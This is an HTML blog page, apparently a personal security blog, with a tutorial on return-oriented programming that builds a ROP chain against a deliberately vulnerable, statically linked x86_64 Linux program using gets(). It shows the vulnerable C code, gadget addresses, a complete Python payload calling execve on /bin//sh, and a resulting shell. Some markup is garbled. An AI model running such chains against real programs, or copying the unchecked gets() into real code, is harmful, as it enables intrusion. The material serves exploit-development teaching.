@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>[Return Oriented Programming] Easy method</title>
+	
+	<meta name="description" content="How to bypass NX/ASLR protections with a statically linked binary using ROP on a x64 Linux system.">
+	
+	<meta name="author" content="Quentin Meffre">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="/assets/css/style.css" rel="stylesheet">
+	<link href="/assets/css/syntax.css" rel="stylesheet">
+
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://github.com/https://github.com/meffre-q">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/https://twitter.com/0xdagger">
+				<i class="fa fa-twitter"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:quentin.meffre@epitech.eu">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="/">
+				<img src="//www.gravatar.com/avatar/?s=35" class="img-circle" />
+				quentin meffre
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="/">Home</a></li>
+				<li><a href="/categories.html">Categories</a></li>
+				<li><a href="/tags.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs" style="">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="/">
+		<img src="/assets/media/XAV_1860.JPG" class="img-circle" width="180" height="250" />
+	</a>
+	<h3 class="title">
+        <a href="/">quentin meffre</a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	Computer science student, passionate about Cyber Security.
+</div>
+
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/https://github.com/meffre-q">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://twitter.com/https://twitter.com/0xdagger">
+				<i class="fa fa-twitter fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:quentin.meffre@epitech.eu">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list-secondary" class="list-unstyled list-inline">
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/https://www.linkedin.com/in/quentin-meffre/">
+				<i class="fa fa-linkedin fa-lg"></i>
+			</a>
+		</li>
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="/feed.xml">
+				<i class="fa fa-rss fa-lg"></i>
+			</a>
+		</li>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>[Return Oriented Programming] Easy method </h1>
+</div>
+	
+<article>
+
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   January 
+	   25th,
+	   
+	   2017
+	 </span>
+	  <div class="article_body">
+	  <p>Tools:</p>
+<ol>
+  <li>objdump</li>
+  <li>ROPgadget</li>
+</ol>
+
+<p>Binary protection:</p>
+<ol>
+  <li>Read Only relocations</li>
+  <li>No exec stack</li>
+  <li>No exec heap</li>
+  <li>ASLR</li>
+</ol>
+
+<p>Compilation: Static</p>
+
+<p>Architecture: x86_64</p>
+
+<p>Operating System: Linux (Debian)</p>
+
+<p>#1. Vulnerable binary
+For this exemple, I will take a very simple code.</p>
+<pre><code class="cpp">#include <stdio.h>
+
+// gcc main.c -fno-stack-protector -Wl,-z,relro,-z,now,-z,noexecstack -static
+int main()
+{
+  char buf[64];
+
+  gets(buf);  // Never use this this function !
+  printf("%s", buf);
+  return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+Like you can see, the vulnerability is near the gets function. As the gets function does not control the size of the input data, we will easily can pass an exploit thanks to the ROP method.
+
+#2. To begin
+Our goal is to get a shell. For this, I choose to use the execve syscall.
+
+For remind: 
+int execve(const char *filename, char *const argv[], char *const envp[]);  RAX = 59
+
+So we will have:
+RDI = "/bin//sh"
+RSI = NULL
+RDX = NULL
+RAX = 59
+
+#3. Payload construction
+To construct our payload, we will first need to set RSI (the filename arg of execve) to the string "/bin//sh". (double slash because of 64 bits architecture)
+We will use the @data section to store our string. To get the data section address we will use objdump:
+<pre><code class="bash">$ objdump -D a.out | grep data
+...
+Disassembly of section .data:
+00000000006b4000 <__data_start>:
+...
+&lt;/code&gt;&lt;/pre&gt;
+Ok, now we need the gadget to set RDI register.
+
+We will need the following gadget:
+pop rdi, to set RSI address point to the data section.
+pop rsi, to store tempararily the data section address. (because the binary does not contain "mov qword ptr [rdi], rax ; ret" gadget)
+pop rax, to store temporarily the string "/bin//sh".
+mov QWORD PTR [rsi], rax, to move the string to the address pointed by rsi. (the data section address)
+
+Thanks to ROPgadget, it's very easy to locate the gadget:
+<pre><code class="bash">$ ROPgadget --binary a.out| egrep 'pop rsi ; ret|pop rax ; ret|mov qword ptr \[rsi\], rax ; ret|pop rdi ; ret'
+...
+0x000000000045f491 : mov qword ptr [rsi], rax ; ret
+0x00000000004314ad : pop rax ; ret
+0x00000000004016b7 : pop rsi ; ret
+0x000000000040159b : pop rdi ; ret
+...</code></pre>
+After multiple test, I found 72 of padding before rewrite RIP.
+So our payload will begin like this:
+<pre><code class="python">p = 'A'*72
+p += pack('&lt;Q', 0x00000000004016b7) # pop rsi ; ret
+p += pack('&lt;Q', 0x00000000006b4000) # adress of the data section
+p += pack('&lt;Q', 0x00000000004314ad) # pop rax ; ret
+p += '/bin//sh'
+p += pack('&lt;Q', 0x000000000045f491) # mov qword ptr [rsi], rax ; ret
+p += pack('&lt;Q', 0x000000000040159b) # pop rdi ; ret
+p += pack('&lt;Q', 0x00000000006b4000) # adress of the data section&lt;/pre&gt;</code>
+
+So now we just have to repeat this step for the next two arguments.
+We will have:
+<pre><code class="python">p += pack('&lt;Q', 0x0000000000432d49) # pop rdx ; pop rsi ; ret
+p += pack('&lt;Q', 0x0000000000000000) # set rdx to NULL
+p += pack('&lt;Q', 0x0000000000000000) # set rsi to NULL</code></pre>
+The last step is to set RAX to 59 (the number of execve syscall) and call the "syscall" instruction.
+<pre><code class="python">p += pack('&lt;Q', 0x00000000004314ad) # pop rax ; ret
+p += pack('&lt;Q', 0x000000000000003b) # Set rax to 59
+p += pack('&lt;Q', 0x0000000000454515) # syscall ; ret</code></pre>
+
+#4. Exploitation
+The whole payload:
+<pre><code class="python">#!/usr/bin/env python2
+
+from struct import pack
+
+p = 'A'*72 # padding
+
+p += pack('&lt;Q', 0x00000000004016b7) # pop rsi ; ret
+p += pack('&lt;Q', 0x00000000006b4000) # address of data section
+p += pack('&lt;Q', 0x00000000004314ad) # pop rax ; ret
+p += '/bin//sh'
+p += pack('&lt;Q', 0x000000000045f491) # mov qword ptr [rsi], rax ; ret
+
+p += pack('&lt;Q', 0x000000000040159b) # pop rdi ; ret
+p += pack('&lt;Q', 0x00000000006b4000) # address of data section
+p += pack('&lt;Q', 0x0000000000432d49) # pop rdx ; pop rsi ; ret
+p += pack('&lt;Q', 0x0000000000000000) # set rdx to 0
+p += pack('&lt;Q', 0x0000000000000000) # set rsi to 0
+p += pack('&lt;Q', 0x00000000004314ad) # pop rax ; ret
+p += pack('&lt;Q', 0x000000000000003b) # Set rax to 59
+p += pack('&lt;Q', 0x0000000000454515) # syscall ; ret
+
+print p</code></pre>
+
+Now we test:
+<pre><code class="bash">$ (python2 rop.py; cat) | ./a.out
+id
+uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)&lt;/pre&gt;</code>
+Done.
+</pre></pre></__data_start></code></pre></stdio.h></code></pre>
+
+	  </div>
+
+		
+		<ul class="tag_box list-unstyled list-inline">
+		  <li><i class="fa fa-folder-open"></i></li>
+		  
+		  
+			 
+				<li><a href="/categories.html#pwn-ref">
+					pwn <span>(2)</span>
+					
+				</a></li>
+			
+		  
+		</ul>
+		  
+
+		
+		<ul class="list-inline">
+		  <li><i class="fa fa-tags"></i></li>
+		  
+		  
+			 
+				<li>
+					<a href="/tags.html#pwn-ref">
+					pwn <span>(3)</span>
+					
+					</a>
+				</li>
+			
+		  
+		  
+		</ul>
+		  
+
+		<hr>
+
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=[Return Oriented Programming] Easy method&via=https://twitter.com/0xdagger"
+           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
+           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus"
+           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+
+      <section class="col-sm-6 author">
+        <img src="//www.gravatar.com/avatar/" class="img-rounded author-image" />
+        <h4 class="section-title author-name">Quentin Meffre</h4>
+        <p class="author-bio">Computer science student, passionate about Cyber Security.</p>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="/general/setup/demo/2013/11/15/hello-world.html" title="Hello World!">&larr; Previous</a></li>
+		  
+		  
+		  <li class="next"><a href="/pwn/2017/05/14/aslr_bruteforce.html" title="ASLR Bruteforce">Next &rarr;</a></li>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2017 Quentin Meffre with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="/assets/js/app.js"></script>
+</body>
+</html>
+
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-90952644-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
